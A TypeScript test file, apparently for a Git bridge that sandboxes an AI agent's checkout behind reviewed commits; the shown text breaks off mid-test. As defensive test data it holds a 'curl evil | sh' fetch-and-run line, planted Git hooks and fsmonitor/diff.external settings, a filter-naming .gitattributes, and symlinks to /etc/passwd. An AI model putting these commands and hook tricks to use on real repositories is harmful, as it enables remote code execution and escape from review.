import assert from "node:assert/strict";
import { execFileSync } from "node:child_process";
import { existsSync } from "node:fs";
import { chmod, link, mkdir, mkdtemp, readFile, readdir, rm, stat, symlink, writeFile } from "node:fs/promises";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { test } from "node:test";
import { ABSENT, GitBridge, WorkspaceBridge, WorkspaceError, filesDigest, versionOf } from "./index.js";

const hasGit = (() => { try { execFileSync("git", ["--version"], { stdio: "ignore" }); return true; } catch { return false; } })();
const skip = hasGit ? false : "git is not installed";
const refuses = async (code: string, run: () => Promise<unknown>): Promise<void> => {
  await assert.rejects(run, (e: unknown) => { assert.ok(e instanceof WorkspaceError, String(e)); assert.equal(e.code, code, e.message); return true; });
};
const sh = (cwd: string, ...args: string[]): string => execFileSync("git", ["-c", "core.hooksPath=/nonexistent-hooks", "-c", "user.name=t", "-c", "user.email=t@t", "-c", "commit.gpgsign=false", ...args], { cwd, encoding: "utf8", env: { ...process.env, GIT_CONFIG_NOSYSTEM: "1", GIT_CONFIG_GLOBAL: "/dev/null" } }).trim();

async function world() {
  const dir = await mkdtemp(join(tmpdir(), "nn-git-"));
  const shared = join(dir, "shared");
  await mkdir(join(shared, "src"), { recursive: true });
  sh(dir, "init", "-q", "-b", "main", shared);
  await writeFile(join(shared, "README.md"), "hello\n"); await writeFile(join(shared, "src", "a.ts"), "export const a = 1;\n"); await writeFile(join(shared, "src", "b.ts"), "export const b = 1;\n");
  sh(shared, "add", "-A"); sh(shared, "commit", "-q", "-m", "first");
  const git = await GitBridge.create({ scratch: join(dir, "scratch") });
  const bridge = new WorkspaceBridge({ shared, state: join(dir, "state"), clock: () => "2026-10-22T14:00:00.000Z" });
  const gitDir = join(dir, "task.git"); const checkout = join(dir, "checkout");
  const commit = await git.head(shared);
  await git.createCheckout({ shared, commit, gitDir, checkout });
  return { dir, shared, git, bridge, gitDir, checkout, commit, done: () => rm(dir, { recursive: true, force: true }) };
}

test("a checkout has the files and no .git; its repository is elsewhere", { skip }, async () => {
  const w = await world();
  try {
    assert.deepEqual((await readdir(w.checkout)).sort(), ["README.md", "src"]);
    assert.equal(existsSync(join(w.checkout, ".git")), false);
    assert.equal(await readFile(join(w.checkout, "src", "a.ts"), "utf8"), "export const a = 1;\n");
    assert.deepEqual(await w.git.status({ gitDir: w.gitDir, checkout: w.checkout }), { dirty: false, entries: [] });
    await refuses("invalid_path", () => w.git.createCheckout({ shared: w.shared, commit: "main", gitDir: join(w.dir, "x.git"), checkout: join(w.dir, "y") }));
    await refuses("invalid_path", () => w.git.createCheckout({ shared: w.shared, commit: w.commit, gitDir: join(w.dir, "z.git"), checkout: w.checkout }));
  } finally { await w.done(); }
});

test("the agent's changes reach the shared workspace only through expected-version writes: modified, new and deleted files", { skip }, async () => {
  const w = await world();
  try {
    await writeFile(join(w.checkout, "src", "a.ts"), "export const a = 2;\n");
    await writeFile(join(w.checkout, "src", "new.ts"), "export const n = 1;\n");
    await rm(join(w.checkout, "src", "b.ts"));
    const changes = await w.git.changes({ gitDir: w.gitDir, checkout: w.checkout });
    assert.deepEqual(changes.map((c) => [c.path, c.op]).sort(), [["src/a.ts", "write"], ["src/b.ts", "delete"], ["src/new.ts", "write"]]);
    const results = await w.git.integrate({ gitDir: w.gitDir, checkout: w.checkout, bridge: w.bridge, author: "agent:ann", reason: "task work" });
    assert.deepEqual(results.map((r) => r.result.status), ["written", "written", "written"]);
    assert.equal(await readFile(join(w.shared, "src", "a.ts"), "utf8"), "export const a = 2;\n");
    assert.equal(existsSync(join(w.shared, "src", "b.ts")), false);
    assert.equal(await readFile(join(w.shared, "src", "new.ts"), "utf8"), "export const n = 1;\n");
  } finally { await w.done(); }
});

test("a file someone else changed meanwhile is not overwritten: the agent's change is kept for review, the others go through", { skip }, async () => {
  const w = await world();
  try {
    await writeFile(join(w.checkout, "src", "a.ts"), "export const a = 'agent';\n");
    await writeFile(join(w.checkout, "README.md"), "agent readme\n");
    await writeFile(join(w.shared, "src", "a.ts"), "export const a = 'someone else';\n");
    const results = await w.git.integrate({ gitDir: w.gitDir, checkout: w.checkout, bridge: w.bridge, author: "agent:ann", reason: "task work" });
    const byPath = Object.fromEntries(results.map((r) => [r.path, r.result.status]));
    assert.deepEqual(byPath, { "README.md": "written", "src/a.ts": "rejected" });
    assert.equal(await readFile(join(w.shared, "src", "a.ts"), "utf8"), "export const a = 'someone else';\n");
    const [kept] = await w.bridge.pending();
    assert.equal(Buffer.from(kept!.content!, "base64").toString(), "export const a = 'agent';\n");
    assert.equal(kept!.expectedVersion, versionOf(Buffer.from("export const a = 1;\n")));
    // The checkout still holds the agent's work.
    assert.equal(await readFile(join(w.checkout, "src", "a.ts"), "utf8"), "export const a = 'agent';\n");
  } finally { await w.done(); }
});

test("a .git the agent creates in the checkout, in any spelling or place, refuses the whole change and nothing is written", { skip }, async () => {
  for (const make of [
    async (c: string) => { await mkdir(join(c, ".git", "hooks"), { recursive: true }); await writeFile(join(c, ".git", "config"), "[core]\n"); },
    async (c: string) => { await writeFile(join(c, "src", ".git"), "gitdir: /tmp/elsewhere\n"); },
    async (c: string) => { await mkdir(join(c, "src", ".GIT"), { recursive: true }); await writeFile(join(c, "src", ".GIT", "HEAD"), "ref: refs/heads/x\n"); },
    async (c: string) => { await mkdir(join(c, "src", ".g​it")); await writeFile(join(c, "src", ".g​it", "x"), "x"); },
  ]) {
    const w = await world();
    try {
      await writeFile(join(w.checkout, "README.md"), "an honest change\n");
      await make(w.checkout);
      await refuses("protected_path", () => w.git.changes({ gitDir: w.gitDir, checkout: w.checkout }));
      await refuses("protected_path", () => w.git.integrate({ gitDir: w.gitDir, checkout: w.checkout, bridge: w.bridge, author: "agent:ann", reason: "x" }));
      assert.equal(await readFile(join(w.shared, "README.md"), "utf8"), "hello\n", "not even the honest change was written");
      assert.deepEqual(await w.bridge.pending(), []);
    } finally { await w.done(); }
  }
});

test("hooks, filters and configuration the agent or a repository names never run", { skip: skip || (process.platform === "win32" ? "POSIX shell scripts" : false) }, async () => {
  const w = await world();
  try {
    const marker = join(w.dir, "RAN");
    const script = `#!/bin/sh\ntouch ${marker}\n`;
    // Hooks in the shared repository, in the checkout's own repository, and a hooks path set in its configuration: none may run.
    await mkdir(join(w.shared, ".git", "hooks"), { recursive: true });
    for (const hook of ["pre-commit", "post-checkout", "post-merge", "pre-push", "fsmonitor-watchman", "post-index-change"]) {
      await writeFile(join(w.shared, ".git", "hooks", hook), script, { mode: 0o755 });
      await mkdir(join(w.gitDir, "hooks"), { recursive: true });
      await writeFile(join(w.gitDir, "hooks", hook), script, { mode: 0o755 });
    }
    await mkdir(join(w.dir, "evil-hooks"));
    for (const hook of ["post-checkout", "pre-commit", "post-index-change"]) await writeFile(join(w.dir, "evil-hooks", hook), script, { mode: 0o755 });
    sh(w.dir, "--git-dir", w.gitDir, "config", "core.hooksPath", join(w.dir, "evil-hooks"));
    sh(w.dir, "--git-dir", w.gitDir, "config", "core.fsmonitor", script.replace(/\n/g, " ").slice(0, 0) + join(w.dir, "evil-hooks", "pre-commit"));
    sh(w.dir, "--git-dir", w.gitDir, "config", "diff.external", join(w.dir, "evil-hooks", "pre-commit"));
    // The agent's own files: attributes naming a filter, a submodule file, a config-looking file.
    await writeFile(join(w.checkout, ".gitattributes"), "* filter=evil\n*.ts diff=evil\n");
    await writeFile(join(w.checkout, ".gitmodules"), `[submodule "x"]\n\tpath = x\n\turl = file://${w.dir}/evil\n`);
    await writeFile(join(w.checkout, "src", "a.ts"), "export const a = 99;\n");
    await w.git.status({ gitDir: w.gitDir, checkout: w.checkout });
    await w.git.changes({ gitDir: w.gitDir, checkout: w.checkout });
    await w.git.integrate({ gitDir: w.gitDir, checkout: w.checkout, bridge: w.bridge, author: "agent:ann", reason: "x" });
    await writeFile(join(w.shared, "README.md"), "moved on\n"); sh(w.shared, "add", "-A"); sh(w.shared, "commit", "-q", "-m", "second");
    await rm(join(w.checkout, ".gitattributes")); await rm(join(w.checkout, ".gitmodules")); await writeFile(join(w.checkout, "src", "a.ts"), "export const a = 1;\n");
    await w.git.refresh({ shared: w.shared, commit: await w.git.head(w.shared), gitDir: w.gitDir, checkout: w.checkout });
    assert.equal(existsSync(marker), false, "no hook, filter or external program ran");
    assert.equal(existsSync(join(w.dir, "evil")), false);
  } finally { await w.done(); }
});

test("dirty work is never replaced: a refresh over changed or new files refuses and leaves everything; a clean checkout moves to the new base", { skip }, async () => {
  const w = await world();
  try {
    await writeFile(join(w.shared, "README.md"), "moved on\n"); sh(w.shared, "add", "-A"); sh(w.shared, "commit", "-q", "-m", "second");
    const next = await w.git.head(w.shared);
    await writeFile(join(w.checkout, "README.md"), "my edit\n");
    await refuses("stale", () => w.git.refresh({ shared: w.shared, commit: next, gitDir: w.gitDir, checkout: w.checkout }));
    assert.equal(await readFile(join(w.checkout, "README.md"), "utf8"), "my edit\n");
    await rm(join(w.checkout, "README.md")); sh(w.dir, "--git-dir", w.gitDir, "--work-tree", w.checkout, "checkout", "-q", "--", "README.md");
    await writeFile(join(w.checkout, "untracked.txt"), "new work\n");
    await refuses("stale", () => w.git.refresh({ shared: w.shared, commit: next, gitDir: w.gitDir, checkout: w.checkout }));
    await rm(join(w.checkout, "untracked.txt"));
    assert.deepEqual(await w.git.refresh({ shared: w.shared, commit: next, gitDir: w.gitDir, checkout: w.checkout }), { base: next });
    assert.equal(await readFile(join(w.checkout, "README.md"), "utf8"), "moved on\n");
  } finally { await w.done(); }
});

test("a link the agent makes in the checkout is refused before anything is written", { skip: skip || (process.platform === "win32" ? "POSIX links" : false) }, async () => {
  const w = await world();
  try {
    await writeFile(join(w.checkout, "README.md"), "an honest change\n");
    await symlink("/etc/passwd", join(w.checkout, "passwd-link"));
    await refuses("link_refused", () => w.git.integrate({ gitDir: w.gitDir, checkout: w.checkout, bridge: w.bridge, author: "agent:ann", reason: "x" }));
    assert.equal(await readFile(join(w.shared, "README.md"), "utf8"), "hello\n");
    assert.equal(existsSync(join(w.shared, "passwd-link")), false);
  } finally { await w.done(); }
});

test("a commit ID that is not a full ID, and a missing shared repository, are refused", { skip }, async () => {
  const w = await world();
  try {
    await refuses("invalid_path", () => w.git.createCheckout({ shared: w.shared, commit: "HEAD", gitDir: join(w.dir, "q.git"), checkout: join(w.dir, "q") }));
    await assert.rejects(() => w.git.head(join(w.dir, "missing")));
    void ABSENT;
  } finally { await w.done(); }
});

test("files the agent's own ignore rules match are still its work: they are listed, integrated, and a refresh will not overwrite them", { skip }, async () => {
  const w = await world();
  try {
    await writeFile(join(w.checkout, ".gitignore"), "*\n!.gitignore\n");
    await writeFile(join(w.checkout, "report.txt"), "hidden by the agent's own rule\n");
    await mkdir(join(w.checkout, "out", "deep"), { recursive: true });
    await writeFile(join(w.checkout, "out", "deep", "data.bin"), "more work\n");
    const status = await w.git.status({ gitDir: w.gitDir, checkout: w.checkout });
    assert.equal(status.dirty, true);
    const paths = (await w.git.changes({ gitDir: w.gitDir, checkout: w.checkout })).map((c) => c.path).sort();
    assert.deepEqual(paths, [".gitignore", "out/deep/data.bin", "report.txt"]);
    const results = await w.git.integrate({ gitDir: w.gitDir, checkout: w.checkout, bridge: w.bridge, author: "agent:ann", reason: "x" });
    assert.ok(results.every((r) => r.result.status === "written"), JSON.stringify(results));
    assert.equal(await readFile(join(w.shared, "report.txt"), "utf8"), "hidden by the agent's own rule\n");
    assert.equal(await readFile(join(w.shared, "out", "deep", "data.bin"), "utf8"), "more work\n");
    // A refresh over ignored work refuses, even when the next commit adds a file at that very path.
    sh(w.shared, "rm", "-q", "--cached", "-r", ".", "--ignore-unmatch"); sh(w.shared, "add", "-A"); sh(w.shared, "commit", "-q", "-m", "second");
    await rm(join(w.checkout, ".gitignore")); await rm(join(w.checkout, "out"), { recursive: true });
    await writeFile(join(w.checkout, ".gitignore"), "report.txt\n");
    const second = await w.git.head(w.shared);
    await refuses("stale", () => w.git.refresh({ shared: w.shared, commit: second, gitDir: w.gitDir, checkout: w.checkout }));
    assert.equal(await readFile(join(w.checkout, "report.txt"), "utf8"), "hidden by the agent's own rule\n");
  } finally { await w.done(); }
});

test("a file whose only change is its mode is reported and skipped, not rewritten; binary files get the right base version; an oversize change names the file", { skip: skip || (process.platform === "win32" ? "POSIX modes" : false) }, async () => {
  const w = await world();
  try {
    const { chmod } = await import("node:fs/promises");
    await chmod(join(w.checkout, "src", "a.ts"), 0o755);
    const binary = Buffer.from([0xff, 0xfe, 0x00, 0x80, 0x81, 0xc3, 0x28]);
    await writeFile(join(w.shared, "blob.bin"), binary); sh(w.shared, "add", "-A"); sh(w.shared, "commit", "-q", "-m", "binary");
    const head = await w.git.head(w.shared);
    await w.git.refresh({ shared: w.shared, commit: head, gitDir: w.gitDir, checkout: w.checkout }).catch(async () => { await chmod(join(w.checkout, "src", "a.ts"), 0o644); await w.git.refresh({ shared: w.shared, commit: head, gitDir: w.gitDir, checkout: w.checkout }); });
    await chmod(join(w.checkout, "src", "a.ts"), 0o755);
    await writeFile(join(w.checkout, "blob.bin"), Buffer.concat([binary, Buffer.from([1])]));
    const changes = await w.git.changes({ gitDir: w.gitDir, checkout: w.checkout });
    const byPath = Object.fromEntries(changes.map((c) => [c.path, c]));
    assert.equal(byPath["src/a.ts"]!.modeOnly, true);
    assert.equal(byPath["blob.bin"]!.baseVersion, versionOf(binary), "the version of a non-UTF-8 file is of its real bytes");
    const results = await w.git.integrate({ gitDir: w.gitDir, checkout: w.checkout, bridge: w.bridge, author: "agent:ann", reason: "x" });
    const out = Object.fromEntries(results.map((r) => [r.path, r.result.status]));
    assert.deepEqual(out, { "blob.bin": "written", "src/a.ts": "skipped" });
    assert.deepEqual(await readFile(join(w.shared, "blob.bin")), Buffer.concat([binary, Buffer.from([1])]));
    // Too big a change names the file.
    await writeFile(join(w.checkout, "big.dat"), Buffer.alloc(9 * 1024 * 1024));
    await assert.rejects(() => w.git.integrate({ gitDir: w.gitDir, checkout: w.checkout, bridge: w.bridge, author: "agent:ann", reason: "x" }), (e: unknown) => e instanceof WorkspaceError && /big\.dat/.test(e.message));
  } finally { await w.done(); }
});

test("a file that was touched or rewritten with the same content does not count as work, and a refresh goes through", { skip }, async () => {
  const w = await world();
  try {
    const { utimes } = await import("node:fs/promises");
    await writeFile(join(w.shared, "README.md"), "moved on\n"); sh(w.shared, "add", "-A"); sh(w.shared, "commit", "-q", "-m", "second");
    const next = await w.git.head(w.shared);
    const later = new Date(Date.now() + 60_000);
    await writeFile(join(w.checkout, "src", "a.ts"), "export const a = 1;\n");
    await utimes(join(w.checkout, "src", "b.ts"), later, later);
    assert.deepEqual(await w.git.status({ gitDir: w.gitDir, checkout: w.checkout }), { dirty: false, entries: [] });
    assert.deepEqual(await w.git.refresh({ shared: w.shared, commit: next, gitDir: w.gitDir, checkout: w.checkout }), { base: next });
    assert.equal(await readFile(join(w.checkout, "README.md"), "utf8"), "moved on\n");
  } finally { await w.done(); }
});

test("staging shows what a reviewer approves; the commit is made only for exactly that tree and base, with the controller's identities and trailers", { skip }, async () => {
  const w = await world();
  try {
    await writeFile(join(w.checkout, "src", "a.ts"), "export const a = 2;\n");
    await writeFile(join(w.checkout, "notes.md"), "new file\n");
    await rm(join(w.checkout, "src", "b.ts"));
    const staged = await w.git.stage({ gitDir: w.gitDir, checkout: w.checkout });
    assert.equal(staged.base, w.commit);
    assert.match(staged.tree, /^[0-9a-f]{40}$/);
    assert.deepEqual(staged.files.map((f) => `${f.op}:${f.path}`).sort(), ["delete:src/b.ts", "write:notes.md", "write:src/a.ts"]);
    assert.deepEqual((await w.git.stage({ gitDir: w.gitDir, checkout: w.checkout })).tree, staged.tree, "staging again gives the same tree");
    const permit = { base: staged.base, tree: staged.tree, filesDigest: filesDigest(staged.files), message: "Change a, add notes, drop b", author: { name: "ann", email: "ann@agents.nimblenewt.invalid" }, committer: { name: "NimbleNewt", email: "controller@nimblenewt.invalid" }, trailers: ["Reviewed-by: owner:rob", "NimbleNewt-Request: cgr-abc"] };
    // The agent changes the staged content after the review: nothing is committed.
    await writeFile(join(w.checkout, "src", "a.ts"), "export const a = 3;\n");
    await refuses("stale", () => w.git.commit({ gitDir: w.gitDir, checkout: w.checkout, permit }));
    await writeFile(join(w.checkout, "src", "a.ts"), "export const a = 2;\n");
    const made = await w.git.commit({ gitDir: w.gitDir, checkout: w.checkout, permit });
    assert.equal(made.parent, w.commit);
    const show = execFileSync("git", ["--git-dir", w.gitDir, "show", "-s", "--format=%P|%T|%an <%ae>|%cn <%ce>|%B", made.commitId], { encoding: "utf8" });
    assert.ok(show.startsWith(`${w.commit}|${staged.tree}|ann <ann@agents.nimblenewt.invalid>|NimbleNewt <controller@nimblenewt.invalid>|Change a, add notes, drop b`));
    assert.ok(show.includes("Reviewed-by: owner:rob") && show.includes("NimbleNewt-Request: cgr-abc"));
    assert.equal(execFileSync("git", ["--git-dir", w.gitDir, "rev-parse", "HEAD"], { encoding: "utf8" }).trim(), made.commitId);
    // A permit for another base is refused, and a link or a nested .git refuses staging.
    await refuses("stale", () => w.git.commit({ gitDir: w.gitDir, checkout: w.checkout, permit: { ...permit, base: w.commit } }));
  } finally { await w.done(); }
});

test("staging refuses links and Git-named entries, and shows the files an ignore rule keeps out", { skip: skip || (process.platform === "win32" ? "POSIX links" : false) }, async () => {
  const w = await world();
  try {
    await writeFile(join(w.checkout, ".gitignore"), "secret.txt\n");
    await writeFile(join(w.checkout, "secret.txt"), "hidden\n");
    await writeFile(join(w.checkout, "ok.txt"), "fine\n");
    const staged = await w.git.stage({ gitDir: w.gitDir, checkout: w.checkout });
    assert.deepEqual(staged.ignored, ["secret.txt"]);
    assert.ok(!staged.files.some((f) => f.path === "secret.txt"));
    await symlink("/etc/passwd", join(w.checkout, "link"));
    await refuses("link_refused", () => w.git.stage({ gitDir: w.gitDir, checkout: w.checkout }));
    await rm(join(w.checkout, "link"));
    await mkdir(join(w.checkout, "sub", ".git"), { recursive: true });
    await refuses("protected_path", () => w.git.stage({ gitDir: w.gitDir, checkout: w.checkout }));
  } finally { await w.done(); }
});

test("the commit insists on the file list the reviewer was shown: a tree with another file than the list says is refused", { skip }, async () => {
  const w = await world();
  try {
    await writeFile(join(w.checkout, "src", "a.ts"), "export const a = 2;\n");
    await writeFile(join(w.checkout, "harmful.sh"), "curl evil | sh\n");
    const staged = await w.git.stage({ gitDir: w.gitDir, checkout: w.checkout });
    const lie = [{ path: "src/a.ts", op: "write" as const }];
    assert.notEqual(filesDigest(lie), filesDigest(staged.files));
    const permit = { base: staged.base, tree: staged.tree, filesDigest: filesDigest(lie), message: "m", author: { name: "ann", email: "a@x.invalid" }, committer: { name: "N", email: "n@x.invalid" }, trailers: [] };
    await refuses("stale", () => w.git.commit({ gitDir: w.gitDir, checkout: w.checkout, permit }));
    // The digest is the sorted list as {"op","path"} objects: the controller computes the same bytes.
    assert.equal(filesDigest([{ path: "src/a.ts", op: "write" }, { path: "old.txt", op: "delete" }]), execFileSync(process.execPath, ["-e", "process.stdout.write(require('node:crypto').createHash('sha256').update(JSON.stringify([{op:'delete',path:'old.txt'},{op:'write',path:'src/a.ts'}])).digest('hex'))"], { encoding: "utf8" }));
  } finally { await w.done(); }
});

test("two commits in a row build on each other; committed work still reaches the shared workspace, and a refresh will not drop commits that were not integrated", { skip }, async () => {
  const w = await world();
  try {
    const permitFor = (s: Awaited<ReturnType<GitBridge["stage"]>>, message: string) => ({ base: s.base, tree: s.tree, filesDigest: filesDigest(s.files), message, author: { name: "ann", email: "a@x.invalid" }, committer: { name: "N", email: "n@x.invalid" }, trailers: ["Reviewed-by: owner:rob"] });
    await writeFile(join(w.checkout, "work.txt"), "first\n");
    const s1 = await w.git.stage({ gitDir: w.gitDir, checkout: w.checkout });
    const c1 = await w.git.commit({ gitDir: w.gitDir, checkout: w.checkout, permit: permitFor(s1, "one") });
    assert.deepEqual((await w.git.status({ gitDir: w.gitDir, checkout: w.checkout })).dirty, false);
    await writeFile(join(w.checkout, "work2.txt"), "second\n");
    const s2 = await w.git.stage({ gitDir: w.gitDir, checkout: w.checkout });
    assert.equal(s2.base, c1.commitId, "the second commit builds on the first");
    assert.deepEqual(s2.files.map((f) => f.path), ["work2.txt"]);
    const c2 = await w.git.commit({ gitDir: w.gitDir, checkout: w.checkout, permit: permitFor(s2, "two") });
    assert.equal(c2.parent, c1.commitId);
    // The committed work is still work for the shared workspace.
    assert.deepEqual((await w.git.changes({ gitDir: w.gitDir, checkout: w.checkout })).map((c) => c.path).sort(), ["work.txt", "work2.txt"]);
    // A refresh would drop it, so it refuses.
    await writeFile(join(w.shared, "README.md"), "moved on\n"); sh(w.shared, "add", "-A"); sh(w.shared, "commit", "-q", "-m", "second");
    const next = await w.git.head(w.shared);
    await refuses("stale", () => w.git.refresh({ shared: w.shared, commit: next, gitDir: w.gitDir, checkout: w.checkout }));
    assert.equal(await readFile(join(w.checkout, "work.txt"), "utf8"), "first\n");
    // Integrate, say so, and the refresh goes through (the integrated files are in the shared workspace).
    const results = await w.git.integrate({ gitDir: w.gitDir, checkout: w.checkout, bridge: w.bridge, author: "agent:ann", reason: "x" });
    assert.ok(results.every((r) => r.result.status === "written"));
    assert.deepEqual(await w.git.markIntegrated({ gitDir: w.gitDir, checkout: w.checkout, bridge: w.bridge }), { moved: true, differing: [] });
    sh(w.shared, "add", "-A"); sh(w.shared, "commit", "-q", "-m", "agent work");
    const after = await w.git.head(w.shared);
    assert.deepEqual(await w.git.refresh({ shared: w.shared, commit: after, gitDir: w.gitDir, checkout: w.checkout }), { base: after });
    assert.equal(await readFile(join(w.checkout, "work2.txt"), "utf8"), "second\n");
  } finally { await w.done(); }
});

test("markIntegrated does not move the base while work is uncommitted or the shared files differ", { skip }, async () => {
  const w = await world();
  try {
    await writeFile(join(w.checkout, "work.txt"), "mine\n");
    assert.equal((await w.git.markIntegrated({ gitDir: w.gitDir, checkout: w.checkout, bridge: w.bridge })).moved, false, "uncommitted");
    const s = await w.git.stage({ gitDir: w.gitDir, checkout: w.checkout });
    await w.git.commit({ gitDir: w.gitDir, checkout: w.checkout, permit: { base: s.base, tree: s.tree, filesDigest: filesDigest(s.files), message: "m", author: { name: "a", email: "a@x.invalid" }, committer: { name: "n", email: "n@x.invalid" }, trailers: [] } });
    const before = await w.git.markIntegrated({ gitDir: w.gitDir, checkout: w.checkout, bridge: w.bridge });
    assert.deepEqual([before.moved, before.differing], [false, ["work.txt"]], "not in the shared workspace yet");
  } finally { await w.done(); }
});

const lines = (n: number, edit?: [number, string]): string => Array.from({ length: n }, (_, i) => (edit !== undefined && edit[0] === i ? edit[1] : `line ${i}`)).join("\n") + "\n";
const advance = async (w: Awaited<ReturnType<typeof world>>, files: Record<string, string | null>): Promise<string> => {
  for (const [path, content] of Object.entries(files)) {
    if (content === null) await rm(join(w.shared, path)); else { await mkdir(join(w.shared, path, ".."), { recursive: true }); await writeFile(join(w.shared, path), content); }
  }
  sh(w.shared, "add", "-A"); sh(w.shared, "commit", "-q", "-m", "moved");
  return w.git.head(w.shared);
};

test("a refresh re-applies the agent's work onto a branch that moved in unrelated files: nothing is lost, the base moves, and the work is still the net difference", { skip }, async () => {
  const w = await world();
  try {
    await writeFile(join(w.checkout, "src", "a.ts"), "export const a = 2;\n");
    await writeFile(join(w.checkout, "mine.ts"), "export const m = 1;\n");
    await rm(join(w.checkout, "src", "b.ts"));
    const next = await advance(w, { "README.md": "hello again\n", "other.ts": "export const o = 1;\n" });
    const r = await w.git.reapply({ shared: w.shared, commit: next, gitDir: w.gitDir, checkout: w.checkout });
    assert.equal(r.base, next); assert.equal(r.previous, w.commit); assert.equal(r.unchanged, false);
    assert.deepEqual(r.conflicts, []); assert.deepEqual(r.merged, []);
    assert.deepEqual(r.taken, ["README.md", "other.ts"]); assert.deepEqual(r.kept, ["mine.ts", "src/a.ts", "src/b.ts"]);
    assert.equal(await readFile(join(w.checkout, "README.md"), "utf8"), "hello again\n");
    assert.equal(await readFile(join(w.checkout, "other.ts"), "utf8"), "export const o = 1;\n");
    assert.equal(await readFile(join(w.checkout, "src", "a.ts"), "utf8"), "export const a = 2;\n");
    assert.equal(existsSync(join(w.checkout, "src", "b.ts")), false);
    const changes = await w.git.changes({ gitDir: w.gitDir, checkout: w.checkout });
    assert.deepEqual(changes.map((c) => [c.path, c.op]).sort(), [["mine.ts", "write"], ["src/a.ts", "write"], ["src/b.ts", "delete"]], "only the agent's own work is left to submit");
    // Refreshing again onto the same head changes nothing.
    const again = await w.git.reapply({ shared: w.shared, commit: next, gitDir: w.gitDir, checkout: w.checkout });
    assert.equal(again.unchanged, true); assert.deepEqual(again.taken, []);
  } finally { await w.done(); }
});

test("a refresh onto a branch that moved in the same file merges non-overlapping edits and lists overlapping ones with markers, never resolving them", { skip }, async () => {
  const w = await world();
  try {
    await writeFile(join(w.shared, "doc.txt"), lines(20)); sh(w.shared, "add", "-A"); sh(w.shared, "commit", "-q", "-m", "doc");
    const start = await w.git.head(w.shared);
    const dir2 = join(w.dir, "c2"); await w.git.createCheckout({ shared: w.shared, commit: start, gitDir: join(w.dir, "t2.git"), checkout: dir2 });
    await writeFile(join(dir2, "doc.txt"), lines(20, [2, "mine two"]));
    await writeFile(join(dir2, "clash.txt"), "x\n");
    const next = await advance(w, { "doc.txt": lines(20, [15, "landing fifteen"]) });
    const clean = await w.git.reapply({ shared: w.shared, commit: next, gitDir: join(w.dir, "t2.git"), checkout: dir2 });
    assert.deepEqual(clean.merged, ["doc.txt"]); assert.deepEqual(clean.conflicts, []);
    const text = await readFile(join(dir2, "doc.txt"), "utf8");
    assert.ok(text.includes("mine two") && text.includes("landing fifteen") && !text.includes("<<<<<<<"));
    // Now the overlap: the agent and the branch both change line 5 in the same file.
    const dir3 = join(w.dir, "c3"); await w.git.createCheckout({ shared: w.shared, commit: next, gitDir: join(w.dir, "t3.git"), checkout: dir3 });
    await writeFile(join(dir3, "doc.txt"), lines(20, [5, "agent five"]).replace("landing fifteen", "landing fifteen"));
    const after = await advance(w, { "doc.txt": (await readFile(join(w.shared, "doc.txt"), "utf8")).replace("line 5", "landing five") });
    const r = await w.git.reapply({ shared: w.shared, commit: after, gitDir: join(w.dir, "t3.git"), checkout: dir3 });
    assert.deepEqual(r.conflicts, [{ path: "doc.txt", kind: "overlap" }]); assert.deepEqual(r.merged, []);
    const marked = await readFile(join(dir3, "doc.txt"), "utf8");
    assert.ok(marked.includes("<<<<<<< mine") && marked.includes("agent five") && marked.includes("landing five") && marked.includes(">>>>>>> landing"));
    // The base moved all the same, and the file with markers is still the agent's work.
    assert.ok((await w.git.changes({ gitDir: join(w.dir, "t3.git"), checkout: dir3 })).some((c) => c.path === "doc.txt"));
  } finally { await w.done(); }
});

test("a file one side deleted and the other changed, a file added on both sides, and a binary file are listed and keep the agent's side", { skip }, async () => {
  const w = await world();
  try {
    await writeFile(join(w.checkout, "src", "a.ts"), "export const a = 'mine';\n");
    await rm(join(w.checkout, "src", "b.ts"));
    await writeFile(join(w.checkout, "both.txt"), "mine\n");
    await writeFile(join(w.checkout, "img.bin"), Buffer.from([0, 1, 2, 3]));
    await writeFile(join(w.shared, "img.bin"), Buffer.from([0, 9, 9]));
    const next = await advance(w, { "src/a.ts": null, "src/b.ts": "export const b = 'theirs';\n", "both.txt": "theirs\n" });
    const r = await w.git.reapply({ shared: w.shared, commit: next, gitDir: w.gitDir, checkout: w.checkout });
    const kinds = Object.fromEntries(r.conflicts.map((c) => [c.path, c.kind]));
    assert.deepEqual(kinds, { "src/a.ts": "deleted-there", "src/b.ts": "deleted-here", "both.txt": "both-added", "img.bin": "binary" });
    assert.equal(await readFile(join(w.checkout, "src", "a.ts"), "utf8"), "export const a = 'mine';\n");
    assert.equal(existsSync(join(w.checkout, "src", "b.ts")), false);
    assert.deepEqual([...(await readFile(join(w.checkout, "img.bin")))], [0, 1, 2, 3]);
  } finally { await w.done(); }
});

test("a refresh that cannot be planned (Git's name on the landing branch, a bad commit ID) changes nothing", { skip }, async () => {
  const w = await world();
  try {
    await writeFile(join(w.checkout, "src", "a.ts"), "export const a = 2;\n");
    await refuses("invalid_path", () => w.git.reapply({ shared: w.shared, commit: "main", gitDir: w.gitDir, checkout: w.checkout }));
    await writeFile(join(w.checkout, ".git"), "x");
    await refuses("protected_path", () => w.git.reapply({ shared: w.shared, commit: w.commit, gitDir: w.gitDir, checkout: w.checkout }));
    await rm(join(w.checkout, ".git"));
    const next = await advance(w, { "README.md": "moved\n" });
    await writeFile(join(w.checkout, "src", "a.ts"), "export const a = 2;\n");
    assert.equal(await readFile(join(w.checkout, "README.md"), "utf8"), "hello\n", "nothing taken from the branch before the refusals");
    const r = await w.git.reapply({ shared: w.shared, commit: next, gitDir: w.gitDir, checkout: w.checkout });
    assert.deepEqual(r.taken, ["README.md"]);
  } finally { await w.done(); }
});

test("reapply writes without following a link: a target swapped for a link between the check and the write is refused and the outside file is untouched", { skip }, async () => {
  const w = await world();
  try {
    const outside = join(w.dir, "outside.txt"); await writeFile(outside, "secret\n");
    const next = await advance(w, { "README.md": "moved\n" });
    await refuses("link_refused", () => w.git.reapply({ shared: w.shared, commit: next, gitDir: w.gitDir, checkout: w.checkout, hooks: { beforeOpen: async (abs) => { await rm(abs); await symlink(outside, abs); } } }));
    assert.equal(await readFile(outside, "utf8"), "secret\n");
    // A hard link made in the same gap is refused before anything is cut.
    const w2 = await world();
    try {
      const out2 = join(w2.dir, "o2.txt"); await writeFile(out2, "keep\n");
      const n2 = await advance(w2, { "README.md": "moved\n" });
      await refuses("link_refused", () => w2.git.reapply({ shared: w2.shared, commit: n2, gitDir: w2.gitDir, checkout: w2.checkout, hooks: { beforeOpen: async (abs) => { await rm(abs); await link(out2, abs); } } }));
